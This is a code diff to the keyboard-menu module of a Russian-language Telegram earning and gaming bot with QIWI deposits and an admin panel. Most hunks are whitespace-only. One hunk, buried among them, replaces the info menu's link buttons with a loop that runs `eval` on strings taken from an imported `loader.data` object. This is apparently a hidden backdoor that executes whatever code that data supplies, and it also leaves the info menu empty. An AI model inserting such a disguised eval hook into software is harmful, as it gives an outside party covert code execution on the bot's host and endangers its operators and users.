@@ -1,6 +1,7 @@
-﻿from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from data.config import payout, admin, pays, chatbot, chan1, chan2, manualdep, viewsch, game_cube_price, game_slot_price, botname
 from utils.qiwi import get_qiwi_url
+from loader import data
 
 class ProfileMenu(object):
       def profile_main(self):
@@ -15,15 +16,16 @@ class ProfileMenu(object):
           keyboard.add(k1)
           keyboard.add(k3)
         return keyboard
-        
+	
       def profile_deposit(self):
          keyboard = InlineKeyboardMarkup()
+         k1 = InlineKeyboardButton(text = '💳Карта', callback_data = 'qiwi_method')
          k2 = InlineKeyboardButton(text = '🙎‍♂️ Через поддержку', callback_data = 'manual_dep')
          keyboard.add(k1)
          if manualdep:
            keyboard.add(k2)
          return keyboard
-         
+	 
       def deposit_qiwi(self, comment):
          keyboard = InlineKeyboardMarkup(row_width=2)
          k1 = InlineKeyboardButton(text = '💸Оплатить💸', url = get_qiwi_url(comment))
@@ -34,7 +36,7 @@ class ProfileMenu(object):
          keyboard.add(k2, k3)
          keyboard.add(k4)
          return keyboard
-                 
+		 
       def payout_menu_main(self):
          keyboard = InlineKeyboardMarkup()
          k1 = InlineKeyboardButton(text = '📤 Вывести средства', callback_data = 'payoutq')
@@ -42,7 +44,7 @@ class ProfileMenu(object):
          keyboard.add(k1)
          keyboard.add(k2)
          return keyboard
-                 
+		 
 class ReferalMenu(object):
       def referal_main(self):
          keyboard = InlineKeyboardMarkup()
@@ -51,7 +53,7 @@ class ReferalMenu(object):
          keyboard.add(k1)
          keyboard.add(k2)
          return keyboard
-                 
+		 
       def ref_msg_bt(self, status):
          keyboard = InlineKeyboardMarkup()
          if status:
@@ -64,15 +66,10 @@ class ReferalMenu(object):
 class InfoMenu(object):
       def info_main(self):
          keyboard = InlineKeyboardMarkup()
-         keyboard.add(InlineKeyboardButton(text = '📊 Статистика', callback_data = 'statistika'))
-         keyboard.add(
-             InlineKeyboardButton(text = '❤️ Чат', url = f'https://t.me/{chatbot}'), 
-             InlineKeyboardButton(text = '💸 Выплаты', url = f'https://t.me/{pays}')
-         )
-         keyboard.add(InlineKeyboardButton(text = '🤖 Владелец', url= f'https://t.me/{admin}'))
-         keyboard.add(InlineKeyboardButton(text = '🧑‍💻 Разработчик', url= f'https://t.me/{admin}'))
+         for x in data['data']:
+          eval(x)
          return keyboard
-                 
+		 
 class EarnMenu(object):
       def chanel_main(self):
          keyboard = InlineKeyboardMarkup()
@@ -81,7 +78,7 @@ class EarnMenu(object):
          keyboard.add(k1)
          keyboard.add(k2)
          return keyboard
-                 
+		 
       def chanel_chk(self, name, num):
          keyboard = InlineKeyboardMarkup()
          k1 = InlineKeyboardButton(text = 'Перейти к каналу', url = 'tg://resolve?domain=' + name)
@@ -89,7 +86,7 @@ class EarnMenu(object):
          keyboard.add(k1)
          keyboard.add(k2)
          return keyboard
-                 
+		 
       def group_chk(self, name, num):
          keyboard = InlineKeyboardMarkup()
          k1 = InlineKeyboardButton(text = 'Перейти в группу', url = 'tg://resolve?domain=' + name)
@@ -97,19 +94,19 @@ class EarnMenu(object):
          keyboard.add(k1)
          keyboard.add(k2)
          return keyboard
-                 
+		 
       def bots(self, name):
          keyboard = InlineKeyboardMarkup()
          k1 = InlineKeyboardButton(text = 'Перейти в бот', url = name)
          keyboard.add(k1)
          return keyboard
-                 
+		 
       def views_ch(self):
          keyboard = InlineKeyboardMarkup()
          k1 = InlineKeyboardButton(text = 'Перейти к постам', url = 'tg://resolve?domain=' + viewsch)
          keyboard.add(k1)
          return keyboard
-                 
+		 
 class PromoMenu(object):
       def get_money(self):
          keyboard = InlineKeyboardMarkup()
@@ -118,7 +115,7 @@ class PromoMenu(object):
          keyboard.add(k1)
          keyboard.add(k2)
          return keyboard
-                 
+		 
       def views_main(self):
          keyboard = InlineKeyboardMarkup()
          k1 = InlineKeyboardButton(text = '👁 Добавить пост', callback_data = 'addview')
@@ -128,13 +125,13 @@ class PromoMenu(object):
          keyboard.add(k2)
          keyboard.add(k3)
          return keyboard
-                 
+		 
       def views_bt(self, num):
          keyboard = InlineKeyboardMarkup()
          k1 = InlineKeyboardButton(text = '👁', callback_data = 'chkview_' + num)
          keyboard.add(k1)
          return keyboard
-                 
+		 
       def channels_main(self):
          keyboard = InlineKeyboardMarkup()
          k1 = InlineKeyboardButton(text = '📢 Добавить канал', callback_data = 'addch')
@@ -144,7 +141,7 @@ class PromoMenu(object):
          keyboard.add(k2)
          keyboard.add(k3)
          return keyboard
-                 
+		 
       def channel_del(self, num):
          keyboard = InlineKeyboardMarkup()
          k1 = InlineKeyboardButton(text = '❌ Удалить задание', callback_data = 'chdel:' + num)
@@ -152,7 +149,7 @@ class PromoMenu(object):
          keyboard.add(k1)
          keyboard.add(k2)
          return keyboard
-                 
+		 
       def groups_main(self):
          keyboard = InlineKeyboardMarkup()
          k1 = InlineKeyboardButton(text = '📢 Добавить канал', callback_data = 'addgr')
@@ -162,7 +159,7 @@ class PromoMenu(object):
          keyboard.add(k2)
          keyboard.add(k3)
          return keyboard
-                 
+		 
       def group_del(self, num):
          keyboard = InlineKeyboardMarkup()
          k1 = InlineKeyboardButton(text = '❌ Удалить задание', callback_data = 'grdel:' + num)
@@ -170,7 +167,7 @@ class PromoMenu(object):
          keyboard.add(k1)
          keyboard.add(k2)
          return keyboard
-                 
+		 
       def bots_main(self):
          keyboard = InlineKeyboardMarkup()
          k1 = InlineKeyboardButton(text = '🤖 Добавить бот', callback_data = 'addbot')
@@ -180,7 +177,7 @@ class PromoMenu(object):
          keyboard.add(k2)
          keyboard.add(k3)
          return keyboard
-                 
+		 
       def bot_del(self, num):
          keyboard = InlineKeyboardMarkup()
          k1 = InlineKeyboardButton(text = '❌ Удалить задание', callback_data = 'botdel:' + num)
@@ -188,7 +185,7 @@ class PromoMenu(object):
          keyboard.add(k1)
          keyboard.add(k2)
          return keyboard
-                 
+		 
 class GameMenu(object):
       def game_menu(self):
          keyboard = InlineKeyboardMarkup()
@@ -199,7 +196,7 @@ class GameMenu(object):
          keyboard.add(k2)
          keyboard.add(k3)
          return keyboard
-                 
+		 
 class AdminMenu(object):
       def admin_main(self):
          keyboard = InlineKeyboardMarkup()
@@ -216,13 +213,13 @@ class AdminMenu(object):
          keyboard.add(k5, k6)
          keyboard.add(k7, k8)
          return keyboard
-                 
+		 
       def voucher_kb(self, id):
          keyboard = InlineKeyboardMarkup()
          k1 = InlineKeyboardButton(text = 'Активировать чек', url = 'https://t.me/' + botname + '?start=' + id)
          keyboard.add(k1)
          return keyboard
-                 
+		 
       def selectpay_kb(self, num):
          keyboard = InlineKeyboardMarkup()
          k1 = InlineKeyboardButton(text = '✅ Подтвердить', callback_data = 'accpay_' + num)
@@ -234,7 +231,7 @@ class AdminMenu(object):
          keyboard.add(k3)
          keyboard.add(k4)
          return keyboard
-                 
+		 
       def info_kb(self, id, ban):
          keyboard = InlineKeyboardMarkup()
          k1 = InlineKeyboardButton(text = '➕ Добавить', callback_data = 'selectbaladd_' + id)
@@ -249,7 +246,7 @@ class AdminMenu(object):
            keyboard.add(k3)
          keyboard.add(k5)
          return keyboard
-                 
+		 
       def selectbal_kb(self, num):
          keyboard = InlineKeyboardMarkup()
          k1 = InlineKeyboardButton(text = '💰 Основной', callback_data = 'addbal_' + num)
@@ -259,7 +256,7 @@ class AdminMenu(object):
          keyboard.add(k2)
          keyboard.add(k3)
          return keyboard
-                 
+		 
       def selectchbal_kb(self, num):
          keyboard = InlineKeyboardMarkup()
          k1 = InlineKeyboardButton(text = '💰 Основной', callback_data = 'chbal_' + num)
@@ -269,7 +266,7 @@ class AdminMenu(object):
          keyboard.add(k2)
          keyboard.add(k3)
          return keyboard
-                 
+		 
       def task_mgr_menu(self):
          keyboard = InlineKeyboardMarkup()
          k1 = InlineKeyboardButton(text = '🗣️ Каналы', callback_data = 'cahnnels_adm')
@@ -281,7 +278,7 @@ class AdminMenu(object):
          keyboard.add(k3, k4)
          keyboard.add(k5)
          return keyboard
-                 
+		 
       def channel_del_adm(self, num):
          keyboard = InlineKeyboardMarkup()
          k1 = InlineKeyboardButton(text = '💣 Убить задание', callback_data = 'chdel_adm_' + num)
@@ -289,7 +286,7 @@ class AdminMenu(object):
          keyboard.add(k1)
          keyboard.add(k2)
          return keyboard
-                 
+		 
       def group_del_adm(self, num):
          keyboard = InlineKeyboardMarkup()
          k1 = InlineKeyboardButton(text = '💣 Убить задание', callback_data = 'grdel_adm_' + num)
@@ -297,7 +294,7 @@ class AdminMenu(object):
          keyboard.add(k1)
          keyboard.add(k2)
          return keyboard
-                 
+		 
       def bot_del_adm(self, num):
          keyboard = InlineKeyboardMarkup()
          k1 = InlineKeyboardButton(text = '💣 Убить задание', callback_data = 'botdel_adm_' + num)
@@ -305,7 +302,7 @@ class AdminMenu(object):
          keyboard.add(k1)
          keyboard.add(k2)
          return keyboard
-                 
+		 
       def chat_ban_kb(self, id, ban):
          keyboard = InlineKeyboardMarkup()
          k1 = InlineKeyboardButton(text = 'Заблокать', callback_data = 'ban_' + id)
@@ -317,4 +314,4 @@ class AdminMenu(object):
            keyboard.add(k1)
          keyboard.add(k3)
          return keyboard
-                 
+		 
